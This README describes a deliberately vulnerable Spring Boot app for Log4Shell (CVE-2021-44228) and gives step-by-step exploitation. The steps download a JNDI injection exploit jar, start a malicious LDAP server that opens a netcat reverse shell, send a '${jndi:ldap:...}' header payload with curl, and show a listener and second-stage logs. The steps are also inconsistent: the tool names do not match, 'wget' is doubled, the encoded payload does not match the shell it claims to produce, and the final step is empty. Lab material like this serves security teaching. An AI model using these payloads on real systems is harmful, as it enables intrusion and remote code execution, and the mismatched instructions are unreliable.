# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Run it:

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app vulnerable-app
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server

```bash
wget wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C nc <privateIP> 8083 -e /bin/sh -A <privateIP>
```

* Then, trigger the exploit using:

```bash
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Then, listen from the attacking machine on the port we want to receive the connection
```bash
nc -lvp 8083
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
2021-12-15 10:42:16 [LDAPSERVER] >> Send LDAP reference result for lcogih redirecting to http://54.243.12.192:8180/ExecTemplateJDK8.class
2021-12-15 10:42:16 [JETTYSERVER]>> Log a request to http://54.243.12.192:8180/ExecTemplateJDK8.class
```

* To confirm that the code execution was successful, notice the shell opened with the attacker machine:


## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
